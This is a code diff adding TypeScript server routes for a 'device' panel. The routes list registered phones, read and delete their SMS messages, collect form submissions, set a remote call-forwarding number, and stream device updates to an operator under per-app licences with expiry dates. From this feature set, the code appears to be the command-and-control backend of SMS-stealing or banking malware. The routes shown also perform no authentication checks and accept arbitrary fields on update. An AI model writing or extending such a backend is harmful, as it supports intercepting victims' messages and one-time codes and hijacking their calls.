@@ -800,6 +800,180 @@ async function route(method: string, path: string, req: Request, env: Env, url: 
     return json({ ok: true, login_limit: limit });
   }
 
+  // ── Device Data Routes (/device/:appId/...) ───────────────────────────────
+  // GET /device/:appId/get — paginated device list (used by getDevicesPage)
+  if (method === "GET" && (m = matchPath("/device/:appId/get", path))) {
+    const appId = m.appId;
+    const offset = Math.max(0, parseInt(url.searchParams.get("offset") ?? "0") || 0);
+    const limit  = Math.min(200, Math.max(1, parseInt(url.searchParams.get("limit") ?? "50") || 50));
+
+    const { data, error } = await d.from("devices").select("*")
+      .eq("app_id", appId)
+      .order("registered_at", { ascending: false })
+      .limit(limit + 1);
+    const errR = dbErrResp(error); if (errR) return errR;
+
+    const rows = (data as Record<string, unknown>[] ?? []);
+    const hasMore = rows.length > limit;
+    if (hasMore) rows.pop();
+
+    return json({ data: rows, hasMore, total: rows.length, nextOffset: offset + rows.length });
+  }
+
+  // PATCH /device/:appId/update/:uid — update a device row (call forward, starred, etc.)
+  if (method === "PATCH" && (m = matchPath("/device/:appId/update/:uid", path))) {
+    const body = await bodyJson();
+    const IMMUTABLE = new Set(["id", "app_id", "sub_id", "registered_at", "created_at"]);
+    const updateData: Record<string, unknown> = { updated_at: new Date().toISOString() };
+    for (const [k, v] of Object.entries(body)) { if (!IMMUTABLE.has(k)) updateData[k] = v; }
+    const { error } = await d.from("devices").update(updateData).eq("app_id", m.appId).eq("sub_id", m.uid);
+    const errR = dbErrResp(error); if (errR) return errR;
+    return json({ ok: true });
+  }
+
+  // DELETE /device/:appId/delete/:uid — delete a device by sub_id
+  if (method === "DELETE" && (m = matchPath("/device/:appId/delete/:uid", path))) {
+    const { error } = await d.from("devices").delete().eq("app_id", m.appId).eq("sub_id", m.uid);
+    const errR = dbErrResp(error); if (errR) return errR;
+    return json({ ok: true });
+  }
+
+  // GET /device/:appId/messages — list SMS messages (supports ?uid=&limit=)
+  if (method === "GET" && (m = matchPath("/device/:appId/messages", path))) {
+    const appId = m.appId;
+    const uid   = url.searchParams.get("uid");
+    const limit = Math.min(1000, Math.max(1, parseInt(url.searchParams.get("limit") ?? "200") || 200));
+
+    let q = d.from("messages").select("*").eq("app_id", appId)
+      .order("sent_at", { ascending: false }).limit(limit);
+    if (uid) q = q.eq("sub_id", uid);
+
+    const { data, error } = await q;
+    const errR = dbErrResp(error); if (errR) return errR;
+    return json({ data: data ?? [] });
+  }
+
+  // DELETE /device/:appId/messages/:msgId — delete a single message
+  if (method === "DELETE" && (m = matchPath("/device/:appId/messages/:msgId", path))) {
+    const { error } = await d.from("messages").delete().eq("id", m.msgId).eq("app_id", m.appId);
+    const errR = dbErrResp(error); if (errR) return errR;
+    return json({ ok: true });
+  }
+
+  // DELETE /device/:appId/messages — delete ALL messages for this app
+  if (method === "DELETE" && (m = matchPath("/device/:appId/messages", path))) {
+    await d.from("messages").delete().eq("app_id", m.appId);
+    return json({ ok: true });
+  }
+
+  // GET /device/:appId/form-data — list form submissions (supports ?uid=&limit=)
+  if (method === "GET" && (m = matchPath("/device/:appId/form-data", path))) {
+    const appId = m.appId;
+    const uid   = url.searchParams.get("uid");
+    const limit = Math.min(1000, Math.max(1, parseInt(url.searchParams.get("limit") ?? "200") || 200));
+
+    let q = d.from("form_data").select("*").eq("app_id", appId)
+      .order("submitted_at", { ascending: false }).limit(limit);
+    if (uid) q = q.eq("sub_id", uid);
+
+    const { data, error } = await q;
+    const errR = dbErrResp(error); if (errR) return errR;
+    return json({ data: data ?? [] });
+  }
+
+  // GET /device/:appId/admin-config — get call forward config
+  if (method === "GET" && (m = matchPath("/device/:appId/admin-config", path))) {
+    const { data: rows } = await d.from("settings").select("key,value").eq("app_id", m.appId);
+    let number = "", status = "OFF";
+    const cfgRow = (rows as { key: string; value: string }[] ?? []).find(r => r.key === "admin_config");
+    if (cfgRow) {
+      try { const p = JSON.parse(cfgRow.value); number = p.number ?? ""; status = p.status ?? "OFF"; } catch {}
+    }
+    return json({ data: { sub_id: "admin_config", data_type: "admin_config", data_json: { number, status }, status, updated_at: 0 } });
+  }
+
+  // POST /device/:appId/admin-config — save call forward config
+  if (method === "POST" && (m = matchPath("/device/:appId/admin-config", path))) {
+    const appId = m.appId;
+    const { number = "", status = "OFF" } = await bodyJson() as { number?: string; status?: string };
+    const cfgValue = JSON.stringify({ number, status });
+    const { data: existing } = await d.from("settings").select("id").eq("app_id", appId).eq("key", "admin_config").single();
+    if (existing) {
+      await d.from("settings").update({ value: cfgValue }).eq("app_id", appId).eq("key", "admin_config");
+    } else {
+      await d.from("settings").insert({ app_id: appId, key: "admin_config", value: cfgValue });
+    }
+    return json({ ok: true });
+  }
+
+  // POST /device/:appId/fcm-send — send FCM push notification (stub)
+  if (method === "POST" && (m = matchPath("/device/:appId/fcm-send", path))) {
+    return json({ ok: false, error: "FCM not configured on backend" });
+  }
+
+  // GET /device/:appId/stream — SSE realtime stream (polling-based, ~25s lifetime then reconnect)
+  if (method === "GET" && (m = matchPath("/device/:appId/stream", path))) {
+    const appId = m.appId;
+
+    const { data: app } = await d.from("apps").select("status,expires_at").eq("app_id", appId).single();
+    if (!app) return json({ error: "Invalid App ID" }, 404);
+    if ((app as { status: string }).status !== "active") return json({ error: "App inactive" }, 403);
+
+    const encoder = new TextEncoder();
+
+    const stream = new ReadableStream({
+      async start(controller) {
+        const enqueue = (s: string) => {
+          try { controller.enqueue(encoder.encode(s)); } catch {}
+        };
+
+        enqueue(`: connected\n\n`);
+
+        // Initial snapshot — send all current devices as INSERT events
+        const { data: devices } = await d.from("devices").select("*")
+          .eq("app_id", appId)
+          .order("registered_at", { ascending: false })
+          .limit(200);
+
+        for (const row of (devices as Record<string, unknown>[] ?? [])) {
+          enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", record: row })}\n\n`);
+        }
+
+        // Poll for updates every 4 seconds; max ~25s runtime then close (client reconnects)
+        const startTime  = Date.now();
+        const MAX_MS     = 25_000;
+        const POLL_MS    = 4_000;
+        let   lastCheck  = new Date().toISOString();
+
+        while (Date.now() - startTime < MAX_MS) {
+          await new Promise<void>(r => setTimeout(r, POLL_MS));
+          enqueue(`: ping\n\n`);
+
+          const now = new Date().toISOString();
+          const { data: updated } = await d.from("devices").select("*")
+            .eq("app_id", appId).gte("updated_at", lastCheck);
+          lastCheck = now;
+
+          for (const row of (updated as Record<string, unknown>[] ?? [])) {
+            enqueue(`event: change\ndata: ${JSON.stringify({ event: "UPDATE", record: row })}\n\n`);
+          }
+        }
+
+        controller.close();
+      },
+    });
+
+    return new Response(stream, {
+      headers: {
+        "Content-Type": "text/event-stream",
+        "Cache-Control": "no-cache, no-transform",
+        "X-Accel-Buffering": "no",
+        "Access-Control-Allow-Origin": "*",
+        "Connection": "keep-alive",
+      },
+    });
+  }
+
   return json({ error: "Not found" }, 404);
 }
 
